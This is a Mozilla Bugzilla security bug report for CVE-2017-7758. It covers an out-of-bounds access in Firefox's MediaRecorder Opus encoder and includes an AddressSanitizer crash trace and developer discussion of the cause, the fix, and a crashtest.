=== Content from bugzilla.mozilla.org_88e5a220_20250126_030308.html ===


![](/static/v20250114.1/extensions/BMO/web/images/moz-fav-one-color-white-rgb.svg)

* [Mozilla Home](https://www.mozilla.org/)
* [Privacy](https://www.mozilla.org/privacy/websites/)
* [Cookies](https://www.mozilla.org/privacy/websites/#cookies)
* [Legal](https://www.mozilla.org/about/legal/)
# [Bugzilla](https://bugzilla.mozilla.org/home "Go to home page")

[Quick Search Tips](/page.cgi?id=quicksearch.html)
[Advanced Search](/query.cgi?format=advanced)

* [Browse](/describecomponents.cgi "Browse bugs by component")
* [Advanced Search](/query.cgi?format=advanced "Search bugs using various criteria")
* [New Bug](/enter_bug.cgi "File a new bug")

* [Reports](/report.cgi)
* [Documentation](https://bmo.readthedocs.io/en/latest/)

* [Log In](/index.cgi?GoAheadAndLogIn=1)

   Log In with GitHub

  or

  Remember me

  [Create an Account](/createaccount.cgi)
  ·
  [Forgot Password](/index.cgi?GoAheadAndLogIn=1#forgot)

* [Browse](/describecomponents.cgi "Browse bugs by component")
* [Advanced Search](/query.cgi?format=advanced "Search bugs using various criteria")
* [New Bug](/enter_bug.cgi "File a new bug")
* [Reports](/report.cgi)
* [Documentation](https://bmo.readthedocs.io/en/latest/)

Please enable JavaScript in your browser to use all the features on this site.

Copy Summary▾

* Markdown
* Markdown (bug number)
* Plain Text
* HTML

View ▾

* Reset Sections
* Expand All Sections
* Collapse All Sections
* History
* [JSON](/rest/bug/1368490)
* [XML](/show_bug.cgi?ctype=xml&id=1368490)

Closed
[Bug 1368490](/show_bug.cgi?id=1368490)
(CVE-2017-7758)

Opened 8 years ago
Closed 8 years ago

# Write past end of allocation in InterleaveTrackData

\*
[Summary:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#short_desc)

Write past end of allocation in InterleaveTrackData

## Categories

### (Core :: Audio/Video: Playback, defect)

[Product:](/describecomponents.cgi?product=Core)

Core
▾

Core
Shared components used by Firefox and other Mozilla software, including handling of Web content; Gecko, HTML, CSS, layout, DOM, scripts, images, networking, etc. Issues with web page layout probably go here, while Firefox user interface issues belong in the [Firefox](https://bugzilla.mozilla.org/describecomponents.cgi?product=Firefox) product. ([More info](https://wiki.mozilla.org/Modules/All#Core))
[See Open Bugs in This Product](/buglist.cgi?product=Core&bug_status=__open__)
[File New Bug in This Product](/enter_bug.cgi?product=Core)
Watch This Product

[Component:](/describecomponents.cgi?product=Core&component=Audio%2FVideo%3A%20Playback#Audio%2FVideo%3A%20Playback)

Audio/Video: Playback
▾

Core :: Audio/Video: Playback
For problems related to the HTML 5 media elements (<video> and <audio>) -- including WebM, MP4, MSE and EME issues. This would also typically include decoding problems in the codecs themselves (e.g. VP8, VP9, H.264, AAC) experienced during playback.
[See Open Bugs in This Component](/buglist.cgi?product=Core&component=Audio%2FVideo%3A%20Playback&bug_status=__open__)
[Recently Fixed Bugs in This Component](/buglist.cgi?product=Core&component=Audio%2FVideo%3A%20Playback&chfield=resolution&chfieldfrom=-6m&chfieldvalue=FIXED&bug_status=__closed__)
[File New Bug in This Component](/enter_bug.cgi?product=Core&component=Audio%2FVideo%3A%20Playback)
Watch This Component

[Version:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#version)

43 Branch

[Platform:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#rep_platform)

Unspecified

Unspecified

[Type:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_type)

defect

[Priority:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#priority)

*Not set*

[Severity:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_severity)

normal

Points:

---

## Tracking

### ()

[Status:](https://wiki.mozilla.org/BMO/UserGuide/BugStatuses)

VERIFIED
FIXED

[Status:](https://wiki.mozilla.org/BMO/UserGuide/BugStatuses)

VERIFIED

FIXED

Mark as Assigned

[Milestone:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#target_milestone)

mozilla55

Iteration:

---

[Project Flags:](https://wiki.mozilla.org/BMO/UserGuide#Project_Flags)

| Webcompat Score | --- |
| --- | --- |
| a11y-review | --- |
| Performance Impact | --- |
| Webcompat Priority | --- |
| Accessibility Severity | --- |

[Tracking Flags:](https://wiki.mozilla.org/BMO/UserGuide#Tracking_Flags)

|  | Tracking | Status |
| --- | --- | --- |
| firefox-esr45 | --- | [wontfix](/buglist.cgi?f1=cf_status_firefox_esr45&o1=equals&v1=wontfix) |
| firefox-esr52 | [54+](/buglist.cgi?f1=cf_tracking_firefox_esr52&o1=equals&v1=54%2B) | [verified](/buglist.cgi?f1=cf_status_firefox_esr52&o1=equals&v1=verified) |
| firefox53 | --- | [wontfix](/buglist.cgi?f1=cf_status_firefox53&o1=equals&v1=wontfix) |
| firefox54 | [+](/buglist.cgi?f1=cf_tracking_firefox54&o1=equals&v1=%2B) | [verified](/buglist.cgi?f1=cf_status_firefox54&o1=equals&v1=verified) |
| firefox55 | [+](/buglist.cgi?f1=cf_tracking_firefox55&o1=equals&v1=%2B) | [verified](/buglist.cgi?f1=cf_status_firefox55&o1=equals&v1=verified) |

|  | Tracking | Status |
| --- | --- | --- |
| firefox-esr45 |  | wontfix |
| relnote-firefox |  | --- |
| thunderbird\_esr115 | --- | --- |
| thunderbird\_esr128 | --- | --- |
| firefox-esr52 | 54+ | verified |
| firefox53 |  | wontfix |
| firefox-esr115 | --- | --- |
| firefox54 | + | verified |
| firefox-esr128 | --- | --- |
| firefox55 | + | verified |
| firefox134 | --- | --- |
| firefox135 | --- | --- |
| firefox136 | --- | --- |

## People

### (Reporter: ntrippar, Assigned: bryce)

[Assignee:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#assigned_to)

![](https://secure.gravatar.com/avatar/6226491cc7996ff7ecf805b6c0ca7f2b?d=mm&size=40)  [bryce](/user_profile?user_id=560379)

[Assignee:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#assigned_to)

Reset Assignee to default

[Mentors:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_mentor)

---

[QA Contact:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#qa_contact)

Reset QA Contact to default

[Reporter:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#reporter)

![](https://secure.gravatar.com/avatar/6f6eefa8fdefe22e00e619f0e8240a40?d=mm&size=40)  [ntrippar](/user_profile?user_id=596168)

[Triage Owner:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#triage_owner)

![](extensions/Gravatar/web/default.jpg)  [jimm](/user_profile?user_id=279663)

[CC:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#cc)

22 people

## References

[Depends on:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#dependson)

---

[Blocks:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#blocks)

[901633](/show_bug.cgi?id=901633 "RESOLVED FIXED - Improve internal support for stereo audio in the webrtc media pipeline")

Dependency [tree](/showdependencytree.cgi?id=1368490&hide_resolved=1)
/ [graph](/showdependencygraph.cgi?id=1368490)

[Regressions:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#regresses)

---

[Regressed by:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#regressed_by)

---

[URL:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_file_loc)

[See Also:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#see_also)

---

## Details

### (Keywords: csectype-bounds, reporter-external, sec-high, Whiteboard: [post-critsmash-triage][adv-main54+][adv-esr52.2+])

[Alias:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#alias)

CVE-2017-7758

[Keywords:](/describekeywords.cgi)

[csectype-bounds](/buglist.cgi?keywords=csectype-bounds&resolution=---),
[reporter-external](/buglist.cgi?keywords=reporter-external&resolution=---),
[sec-high](/buglist.cgi?keywords=sec-high&resolution=---)

[Whiteboard:](https://wiki.mozilla.org/BMO/UserGuide/Whiteboard)

[post-critsmash-triage][adv-main54+][adv-esr52.2+]

QA Whiteboard:

---

Has STR:

---

Change Request:

---

[Votes:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#votes)

0

Bug Flags:

| [dveditz](/user_profile?user_id=1689) | [sec-bounty](#a614034_1689 "8 years ago") | + |
| --- | --- | --- |
| [dveditz](/user_profile?user_id=1689) | sec-bounty | + |
| --- | --- | --- |
| [RyanVM](/user_profile?user_id=75935) | [in-testsuite](#c35 "7 years ago") | + |
| --- | --- | --- |
| [RyanVM](/user_profile?user_id=75935) | in-testsuite | + |
| --- | --- | --- |
|  | behind-pref |  |
| --- | --- | --- |
|  | firefox-backlog |  |
|  | sec-bounty-hof |  |
|  | in-qa-testsuite |  | | |
|  | qe-verify |  |

## Crash Data

Signature:

*None*

## Security

### (public)

This bug is publicly visible.

## User Story

## Attachments

### (3 files, 1 obsolete file)

| [poc.html](/attachment.cgi?id=8872359)  [8 years ago](#c0)  [ntrippar](/user_profile?user_id=596168)   625 bytes, text/html |  | [Details](/attachment.cgi?id=8872359&action=edit) |
| --- | --- | --- |
| [Make sure number of channels is correctly set for opus encoder](/attachment.cgi?id=8872553)  [8 years ago](#c5)  [Bryce Seager van Dyk [:bryce] (he/him) - Not reading bugmail](/user_profile?user_id=560379)   1.83 KB, patch | jesup : [review+](#a203166_11539 "8 years ago")  abillings : [approval-mozilla-beta+](#c22 "8 years ago")  abillings : [approval-mozilla-esr52+](#c22 "8 years ago")  abillings : [sec-approval+](#c22 "8 years ago") | [Details](/attachment.cgi?id=8872553&action=edit) | [Diff](/attachment.cgi?id=8872553&action=diff) | [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=1368490&attachment=8872553) |
| [Add crashtest for media recorder when reducing number of source stream channels](/attachment.cgi?id=8872791)  [8 years ago](#c13)  [Bryce Seager van Dyk [:bryce] (he/him) - Not reading bugmail](/user_profile?user_id=560379)   2.07 KB, patch |  | [Details](/attachment.cgi?id=8872791&action=edit) | [Diff](/attachment.cgi?id=8872791&action=diff) | [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=1368490&attachment=8872791) |
| [Add crashtest for media recorder when reducing number of source stream channels](/attachment.cgi?id=8872793)  [8 years ago](#c14)  [Bryce Seager van Dyk [:bryce] (he/him) - Not reading bugmail](/user_profile?user_id=560379)   2.01 KB, patch | jesup : [review+](#c16 "8 years ago")  abillings : [sec-approval+](#c32 "7 years ago") | [Details](/attachment.cgi?id=8872793&action=edit) | [Diff](/attachment.cgi?id=8872793&action=diff) | [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=1368490&attachment=8872793) |

Show Obsolete

Bottom ↓
Tags ▾

* Reset

Timeline ▾

* Reset
* Collapse All
* Expand All
* Comments Only

|  | [ntrippar](/user_profile?user_id=596168)  Reporter |  |
| --- | --- | --- |
| [Description](/show_bug.cgi?id=1368490#c0)• 8 years ago |
|  | |

Attached file
[poc.html](attachment.cgi?id=8872359)
— [Details](attachment.cgi?id=8872359&action=edit)

User Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10\_12\_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36
Steps to reproduce:
open the file and it will crash. now you added the vector accessor checks. in tor browser in my last test was maybe exploitable because didnt have that check
Actual results:
=================================================================
==23790==ERROR: AddressSanitizer: SEGV on unknown address 0x000000000000 (pc 0x00000051b5b6 bp 0x7fa3d2c89e50 sp 0x7fa3d2c89ce0 T25)
==23790==The signal is caused by a WRITE memory access.
==23790==Hint: address points to the zero page.
#0 0x51b5b5 in MOZ\_CrashPrintf /home/worker/workspace/build/src/mfbt/Assertions.cpp:63:3
#1 0x7fa4370e5ebf in InvalidArrayIndex\_CRASH(unsigned long, unsigned long) /home/worker/workspace/build/src/xpcom/ds/nsTArray.cpp:26:3
#2 0x7fa43c182296 in ElementAt /home/worker/workspace/build/src/obj-firefox/dist/include/nsTArray.h:1043:7
#3 0x7fa43c182296 in operator[] /home/worker/workspace/build/src/obj-firefox/dist/include/nsTArray.h:1081
#4 0x7fa43c182296 in mozilla::AudioTrackEncoder::InterleaveTrackData(mozilla::AudioChunk&, int, unsigned int, float\*) /home/worker/workspace/build/src/dom/media/encoder/TrackEncoder.cpp:151
#5 0x7fa43c17dfd7 in mozilla::OpusTrackEncoder::GetEncodedTrack(mozilla::EncodedFrameContainer&) /home/worker/workspace/build/src/dom/media/encoder/OpusTrackEncoder.cpp:349:9
#6 0x7fa43c1794a6 in mozilla::MediaEncoder::WriteEncodedDataToMuxer(mozilla::TrackEncoder\*) /home/worker/workspace/build/src/dom/media/encoder/MediaEncoder.cpp:344:32
#7 0x7fa43c1779f5 in mozilla::MediaEncoder::GetEncodedData(nsTArray<nsTArray<unsigned char> >\*, nsAString&) /home/worker/workspace/build/src/dom/media/encoder/MediaEncoder.cpp:290:12
#8 0x7fa43c0aa574 in mozilla::dom::MediaRecorder::Session::Extract(bool) /home/worker/workspace/build/src/dom/media/MediaRecorder.cpp:620:15
#9 0x7fa43c0aa0aa in mozilla::dom::MediaRecorder::Session::ExtractRunnable::Run() /home/worker/workspace/build/src/dom/media/MediaRecorder.cpp:278:19
#10 0x7fa4371bd02e in nsThread::ProcessNextEvent(bool, bool\*) /home/worker/workspace/build/src/xpcom/threads/nsThread.cpp:1321:14
#11 0x7fa4371c8db8 in NS\_ProcessNextEvent(nsIThread\*, bool) /home/worker/workspace/build/src/xpcom/threads/nsThreadUtils.cpp:472:10
#12 0x7fa437f6e800 in mozilla::ipc::MessagePumpForNonMainThreads::Run(base::MessagePump::Delegate\*) /home/worker/workspace/build/src/ipc/glue/MessagePump.cpp:338:20
#13 0x7fa437ecae00 in RunInternal /home/worker/workspace/build/src/ipc/chromium/src/base/message\_loop.cc:238:10
#14 0x7fa437ecae00 in RunHandler /home/worker/workspace/build/src/ipc/chromium/src/base/message\_loop.cc:231
#15 0x7fa437ecae00 in MessageLoop::Run() /home/worker/workspace/build/src/ipc/chromium/src/base/message\_loop.cc:211
#16 0x7fa4371b5502 in nsThread::ThreadFunc(void\*) /home/worker/workspace/build/src/xpcom/threads/nsThread.cpp:501:11
#17 0x7fa4517d8453 in \_pt\_root /home/worker/workspace/build/src/nsprpub/pr/src/pthreads/ptthread.c:216:5
#18 0x7fa45519f6d9 in start\_thread (/lib/x86\_64-linux-gnu/libpthread.so.0+0x76d9)
#19 0x7fa45422517e in clone /build/glibc-cxyGtm/glibc-2.24/misc/../sysdeps/unix/sysv/linux/x86\_64/clone.S:105
AddressSanitizer can not provide additional info.
SUMMARY: AddressSanitizer: SEGV /home/worker/workspace/build/src/mfbt/Assertions.cpp:63:3 in MOZ\_CrashPrintf
Thread T25 (Media\_Encoder) created by T0 (Web Content) here:
#0 0x4a3d56 in \_\_interceptor\_pthread\_create /builds/slave/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan\_interceptors.cc:245:3
#1 0x7fa4517d51f9 in \_PR\_CreateThread /home/worker/workspace/build/src/nsprpub/pr/src/pthreads/ptthread.c:457:14
#2 0x7fa4517d4e0e in PR\_CreateThread /home/worker/workspace/build/src/nsprpub/pr/src/pthreads/ptthread.c:548:12
#3 0x7fa4371b7737 in nsThread::Init(nsACString const&) /home/worker/workspace/build/src/xpcom/threads/nsThread.cpp:682:8
#4 0x7fa4371c1fff in nsThreadManager::NewNamedThread(nsACString const&, unsigned int, nsIThread\*\*) /home/worker/workspace/build/src/xpcom/threads/nsThreadManager.cpp:273:22
#5 0x7fa4371c4213 in NS\_NewNamedThread(nsACString const&, nsIThread\*\*, nsIRunnable\*, unsigned int) /home/worker/workspace/build/src/xpcom/threads/nsThreadUtils.cpp:113:45
#6 0x7fa43c0a5a2a in NS\_NewNamedThread<14> /home/worker/workspace/build/src/obj-firefox/dist/include/nsThreadUtils.h:72:10
#7 0x7fa43c0a5a2a in mozilla::dom::MediaRecorder::Session::InitEncoder(unsigned char, int) /home/worker/workspace/build/src/dom/media/MediaRecorder.cpp:771
#8 0x7fa43c0a6b3f in mozilla::dom::MediaRecorder::Session::TracksAvailableCallback::NotifyTracksAvailable(mozilla::DOMMediaStream\*) /home/worker/workspace/build/src/dom/media/MediaRecorder.cpp:355:17
#9 0x7fa43be42753 in mozilla::DOMMediaStream::CheckTracksAvailable() /home/worker/workspace/build/src/dom/media/DOMMediaStream.cpp:1287:19
#10 0x7fa43be5f112 in applyImpl<mozilla::DOMMediaStream, void (mozilla::DOMMediaStream::\*)()> /home/worker/workspace/build/src/obj-firefox/dist/include/nsThreadUtils.h:1084:12
#11 0x7fa43be5f112 in apply<mozilla::DOMMediaStream, void (mozilla::DOMMediaStream::\*)()> /home/worker/workspace/build/src/obj-firefox/dist/include/nsThreadUtils.h:1090
#12 0x7fa43be5f112 in mozilla::detail::RunnableMethodImpl<mozilla::DOMMediaStream\*, void (mozilla::DOMMediaStream::\*)(), true, (mozilla::RunnableKind)0>::Run() /home/worker/workspace/build/src/obj-firefox/dist/include/nsThreadUtils.h:1133
#13 0x7fa4371bd02e in nsThread::ProcessNextEvent(bool, bool\*) /home/worker/workspace/build/src/xpcom/threads/nsThread.cpp:1321:14
#14 0x7fa4371c8db8 in NS\_ProcessNextEvent(nsIThread\*, bool) /home/worker/workspace/build/src/xpcom/threads/nsThreadUtils.cpp:472:10
#15 0x7fa437f6d461 in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate\*) /home/worker/workspace/build/src/ipc/glue/MessagePump.cpp:96:21
#16 0x7fa437ecae00 in RunInternal /home/worker/workspace/build/src/ipc/chromium/src/base/message\_loop.cc:238:10
#17 0x7fa437ecae00 in RunHandler /home/worker/workspace/build/src/ipc/chromium/src/base/message\_loop.cc:231
#18 0x7fa437ecae00 in MessageLoop::Run() /home/worker/workspace/build/src/ipc/chromium/src/base/message\_loop.cc:211
#19 0x7fa43d37b80f in nsBaseAppShell::Run() /home/worker/workspace/build/src/widget/nsBaseAppShell.cpp:156:27
#20 0x7fa440c0eea7 in XRE\_RunAppShell() /home/worker/workspace/build/src/toolkit/xre/nsEmbedFunctions.cpp:893:22
#21 0x7fa437ecae00 in RunInternal /home/worker/workspace/build/src/ipc/chromium/src/base/message\_loop.cc:238:10
#22 0x7fa437ecae00 in RunHandler /home/worker/workspace/build/src/ipc/chromium/src/base/message\_loop.cc:231
#23 0x7fa437ecae00 in MessageLoop::Run() /home/worker/workspace/build/src/ipc/chromium/src/base/message\_loop.cc:211
#24 0x7fa440c0e909 in XRE\_InitChildProcess(int, char\*\*, XREChildData const\*) /home/worker/workspace/build/src/toolkit/xre/nsEmbedFunctions.cpp:709:34
#25 0x4eb7a3 in content\_process\_main /home/worker/workspace/build/src/browser/app/../../ipc/contentproc/plugin-container.cpp:64:30
#26 0x4eb7a3 in main /home/worker/workspace/build/src/browser/app/nsBrowserApp.cpp:285
#27 0x7fa45413d3f0 in \_\_libc\_start\_main /build/glibc-cxyGtm/glibc-2.24/csu/../csu/libc-start.c:291
==23790==ABORTING

|  | [:Gijs (he/him)](/user_profile?user_id=159069) |  |
| --- | --- | --- |
| [Comment 1](/show_bug.cgi?id=1368490#c1)• 8 years ago |
|  | |

Maire or Chris, can you forward to the relevant folks? Thanks!Group: firefox-core-security → core-securityComponent: Untriaged → Audio/Video: PlaybackFlags: needinfo?(mreavy)Flags: needinfo?(cpearce)Product: Firefox → Core

|  | [Chris Pearce [:cpearce (Not reading bugmail)]](/user_profile?user_id=287422) |  |
| --- | --- | --- |
| [Comment 2](/show_bug.cgi?id=1368490#c2)• 8 years ago |
|  | |

Bryce, can you look at this?Flags: needinfo?(mreavy)Flags: needinfo?(cpearce)Flags: needinfo?(bvandyk)

|  | [Bryce Seager van Dyk [:bryce] (he/him) - Not reading bugmail](/user_profile?user_id=560379)  Assignee |  |
| --- | --- | --- |
| [Comment 3](/show_bug.cgi?id=1368490#c3)• 8 years ago |
|  | |

Will do.Assignee: nobody → bvandykFlags: needinfo?(bvandyk)

|  | [Bryce Seager van Dyk [:bryce] (he/him) - Not reading bugmail](/user_profile?user_id=560379)  Assignee |  |
| --- | --- | --- |
| [Comment 4](/show_bug.cgi?id=1368490#c4)• 8 years ago |
|  | |

The issue here is that the OpusEncoder sets mChannels at Init, but the number of channels on the stream to the recorder can change in that encoder's lifetime without the encoder being updated. The AudioTrackEncoder does not anticipate this change and if newNumChannels < oldNumChannels then we end up reading out of bounds (specifically off the end of aChunk.mChannelData). This is easily reproducible as shown by the proof of concept. The out of bounds data is read into an array that expects audio channel data. It looks to me like this data will be interleaved and then fed through the opus encoder before being exposed by the media recorder API.
Would appreciate checking of my working. At this stage I think the upshot is exposure of memory (whatever follows aChunk.mChannelData), this data is fed through the opus encoder before being exposed.
Have a WIP fix, to follow shortly for feedback.

|  | [Bryce Seager van Dyk [:bryce] (he/him) - Not reading bugmail](/user_profile?user_id=560379)  Assignee |  |
| --- | --- | --- |
| [Comment 5](/show_bug.cgi?id=1368490#c5)• 8 years ago |
|  | |

Attached patch

[Make sure number of channels is correctly set for opus encoder](attachment.cgi?id=8872553&action=diff)
— [Details](attachment.cgi?id=8872553&action=edit)
— [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=1368490&attachment=8872553)

|  | [Bryce Seager van Dyk [:bryce] (he/him) - Not reading bugmail](/user_profile?user_id=560379)  Assignee |  |
| --- | --- | --- |
| [Comment 6](/show_bug.cgi?id=1368490#c6)• 8 years ago |
|  | |

Comment on [attachment 8872553](/attachment.cgi?id=8872553 "Make sure number of channels is correctly set for opus encoder") [[details]](/attachment.cgi?id=8872553&action=edit "Make sure number of channels is correctly set for opus encoder") [[diff]](/attachment.cgi?id=8872553&action=diff "Make sure number of channels is correctly set for opus encoder") [[review]](/page.cgi?id=splinter.html&ignore=&bug=1368490&attachment=8872553)
Make sure number of channels is correctly set for opus encoder
I don't think it makes sense to change the number of channels mid flight for opus (webm doesn't support this, and the opus encoder/decoder don't appear to). As such I suggest we keep the same encoder, and up or down sample to maintain the same number of channels. I've run a couple of test cases over chrome, who appear to do this.
We could also stop recording, but I prefer the above as more user friendly, barring any concerns.
[Attachment #8872553](/attachment.cgi?id=8872553&action=edit "Make sure number of channels is correctly set for opus encoder") -
Flags: review?(pehrson)

|  | [Andreas Pehrson [:pehrsons]](/user_profile?user_id=489889) |  |
| --- | --- | --- |
| [Comment 7](/show_bug.cgi?id=1368490#c7)• 8 years ago |
|  | |

Comment on [attachment 8872553](/attachment.cgi?id=8872553 "Make sure number of channels is correctly set for opus encoder") [[details]](/attachment.cgi?id=8872553&action=edit "Make sure number of channels is correctly set for opus encoder") [[diff]](/attachment.cgi?id=8872553&action=diff "Make sure number of channels is correctly set for opus encoder") [[review]](/page.cgi?id=splinter.html&ignore=&bug=1368490&attachment=8872553)
Make sure number of channels is correctly set for opus encoder
Review of [attachment 8872553](/attachment.cgi?id=8872553 "Make sure number of channels is correctly set for opus encoder") [[details]](/attachment.cgi?id=8872553&action=edit "Make sure number of channels is correctly set for opus encoder") [[diff]](/attachment.cgi?id=8872553&action=diff "Make sure number of channels is correctly set for opus encoder") [[review]](/page.cgi?id=splinter.html&ignore=&bug=1368490&attachment=8872553):
-----------------------------------------------------------------
The code looks good as far as avoiding a crash goes.
What happens when the number of channels increases? Do we know which channels to pick and encode?
What happens when the number of channels decreases? Do we encode silence or garbage on the ones that didn't make the cut?
Would it make more sense to abort and raise an error event instead?
Also write a crash test before landing please. The attachment would be easy to convert.
[Attachment #8872553](/attachment.cgi?id=8872553&action=edit "Make sure number of channels is correctly set for opus encoder") -
Flags: review?(pehrson)

|  | [Andreas Pehrson [:pehrsons]](/user_profile?user_id=489889) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1368490#a68886_489889)• 8 years ago |

Status: UNCONFIRMED → ASSIGNEDEver confirmed: true

|  | [Bryce Seager van Dyk [:bryce] (he/him) - Not reading bugmail](/user_profile?user_id=560379)  Assignee |  |
| --- | --- | --- |
| [Comment 8](/show_bug.cgi?id=1368490#c8)• 8 years ago |
|  | |

Will do on the crash test.
Does the existing upmix and downmix when interleaving code handle those cases? Would you prefer the error approach? I'm not sure which is more intuitive/useful to the user. If they're expecting a channel # change in the output file then it could be misleading to not error. However, an error would break web app compat between us and chrome.
Are these questions you'd like resolved as part of this bug, or food for thought going forward?

|  | [Frederik Braun [:freddy]](/user_profile?user_id=428608) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1368490#a70679_428608)• 8 years ago |

Flags: sec-bounty?

|  | [Andreas Pehrson [:pehrsons]](/user_profile?user_id=489889) |  |
| --- | --- | --- |
| [Comment 9](/show_bug.cgi?id=1368490#c9)• 8 years ago |
|  | |

(In reply to Bryce Van Dyk (:SingingTree) from [comment #8](/show_bug.cgi?id=1368490#c8 "VERIFIED FIXED - Write past end of allocation in InterleaveTrackData"))
> Does the existing upmix and downmix when interleaving code handle those
> cases? Would you prefer the error approach? I'm not sure which is more
> intuitive/useful to the user. If they're expecting a channel # change in the
> output file then it could be misleading to not error. However, an error
> would break web app compat between us and chrome.
Is there even existing code to upmix and downmix? I see that we support mono and stereo only, but nothing about dynamic changes. Is that even supported by opus? If we want to support this we IMHO need a set of gtests to prove its functionality.
My first thought is to follow the spec. If the spec doesn't mention what to do, and what to do isn't obvious, we should raise an error to show that the feature is unsupported and no further thought has been given on the behavior. Like we did for video resolution changes until we added support and tests.
IMO compat is secondary here since it's not in the spec, and it's not a regression.

|  | [Maire Reavy [:mreavy]](/user_profile?user_id=74434) |  |
| --- | --- | --- |
| [Comment 10](/show_bug.cgi?id=1368490#c10)• 8 years ago |
|  | |

Thanks, Chris and Bryce, for handling this.

|  | [Randell Jesup [:jesup] (needinfo me)](/user_profile?user_id=11539) |  |
| --- | --- | --- |
| [Comment 11](/show_bug.cgi?id=1368490#c11)• 8 years ago |
|  | |

(In reply to Andreas Pehrson [:pehrsons] (Telenor) from [comment #9](/show_bug.cgi?id=1368490#c9 "VERIFIED FIXED - Write past end of allocation in InterleaveTrackData"))
> (In reply to Bryce Van Dyk (:SingingTree) from [comment #8](/show_bug.cgi?id=1368490#c8 "VERIFIED FIXED - Write past end of allocation in InterleaveTrackData"))
> > Does the existing upmix and downmix when interleaving code handle those
> > cases? Would you prefer the error approach? I'm not sure which is more
> > intuitive/useful to the user. If they're expecting a channel # change in the
> > output file then it could be misleading to not error. However, an error
> > would break web app compat between us and chrome.
>
> Is there even existing code to upmix and downmix? I see that we support mono
> and stereo only, but nothing about dynamic changes. Is that even supported
> by opus? If we want to support this we IMHO need a set of gtests to prove
> its functionality.
For audio playback and other reasons, we have dynamic up/down-mixers, including this one.
It handles channels on a chunk-by-chunk basis, adapting it to the target. If you're recording in stereo, it will handle a stream of mixed mono and stereo fine. Opus never sees a change in the number of tracks encoded (which is the point of this function).
> My first thought is to follow the spec. If the spec doesn't mention what to
> do, and what to do isn't obvious, we should raise an error to show that the
> feature is unsupported and no further thought has been given on the
> behavior. Like we did for video resolution changes until we added support
> and tests.
This patch is just fixing a bug in the adaptive mixing to the target number of channels (which is what I think most people would expect; erroring on channels changing is not something I would anticipate as an app developer). And it already works for the mono input to a stereo recorder. (And probably usually works in the non-ASAN case, perhaps always or virtually so.)
> IMO compat is secondary here since it's not in the spec, and it's not a
> regression.
Bryce: when landing this bug, make the test a separate patch, and do NOT check in the test with the patch unless told to by the security guys (who give security-approval)Group: media-core-security

|  | [Randell Jesup [:jesup] (needinfo me)](/user_profile?user_id=11539) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1368490#a80824_11539)• 8 years ago |

Keywords: [csectype-bounds](/buglist.cgi?keywords=csectype-bounds&resolution=---),
[sec-high](/buglist.cgi?keywords=sec-high&resolution=---)

|  | [Randell Jesup [:jesup] (needinfo me)](/user_profile?user_id=11539) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1368490#a80885_11539)• 8 years ago |

Summary: heap overflow in InterleaveTrackData → Write past end of allocation in InterleaveTrackData

|  | [Andreas Pehrson [:pehrsons]](/user_profile?user_id=489889) |  |
| --- | --- | --- |
| [Comment 12](/show_bug.cgi?id=1368490#c12)• 8 years ago |
|  | |

(In reply to Randell Jesup [:jesup] from [comment #11](/show_bug.cgi?id=1368490#c11 "VERIFIED FIXED - Write past end of allocation in InterleaveTrackData"))
> (In reply to Andreas Pehrson [:pehrsons] (Telenor) from [comment #9](/show_bug.cgi?id=1368490#c9 "VERIFIED FIXED - Write past end of allocation in InterleaveTrackData"))
> > Is there even existing code to upmix and downmix? I see that we support mono
> > and stereo only, but nothing about dynamic changes. Is that even supported
> > by opus? If we want to support this we IMHO need a set of gtests to prove
> > its functionality.
>
> For audio playback and other reasons, we have dynamic up/down-mixers,
> including this one.
Ah, I see now. My apologies, this is not code that I know so well. Get a test up and I or jesup can r+.

|  | [Bryce Seager van Dyk [:bryce] (he/him) - Not reading bugmail](/user_profile?user_id=560379)  Assignee |  |
| --- | --- | --- |
| [Comment 13](/show_bug.cgi?id=1368490#c13)• 8 years ago |
|  | |

Attached patch

[Add crashtest for media recorder when reducing number of source stream channels](attachment.cgi?id=8872791&action=diff) (obsolete)
— [Details](attachment.cgi?id=8872791&action=edit)
— [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=1368490&attachment=8872791)

|  | [Bryce Seager van Dyk [:bryce] (he/him) - Not reading bugmail](/user_profile?user_id=560379)  Assignee |  |
| --- | --- | --- |
| [Comment 14](/show_bug.cgi?id=1368490#c14)• 8 years ago |
|  | |

Attached patch

[Add crashtest for media recorder when reducing number of source stream channels](attachment.cgi?id=8872793&action=diff)
— [Details](attachment.cgi?id=8872793&action=edit)
— [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=1368490&attachment=8872793)

|  | [Bryce Seager van Dyk [:bryce] (he/him) - Not reading bugmail](/user_profile?user_id=560379)  Assignee |  |
| --- | --- | --- |
